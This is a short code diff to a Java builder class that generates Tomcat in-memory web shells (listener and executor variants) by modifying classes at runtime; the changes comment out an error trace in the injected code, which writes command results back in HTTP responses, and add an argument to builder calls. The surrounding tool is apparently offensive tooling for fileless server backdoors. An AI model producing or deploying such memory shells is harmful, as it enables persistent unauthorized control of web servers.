@@ -50,13 +50,13 @@ public class TomcatMSJavaClassBuilder {
                 "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
                 "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
                 "} catch (Exception ignored) {\n" +
-                "    ignored.printStackTrace();\n" +
+//                "    ignored.printStackTrace();\n" +
                 "}}");
 
         // 字段信息修改
         JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
 
-        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
+        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
     }
 
     @MemShell(MemShell.Listener)
@@ -77,7 +77,7 @@ public class TomcatMSJavaClassBuilder {
         // 字段信息修改
         JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
 
-        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
+        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
     }
 
     @MemShell(MemShell.Executor)
@@ -99,6 +99,6 @@ public class TomcatMSJavaClassBuilder {
         // 字段信息修改
         JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
 
-        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
+        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
     }
 }
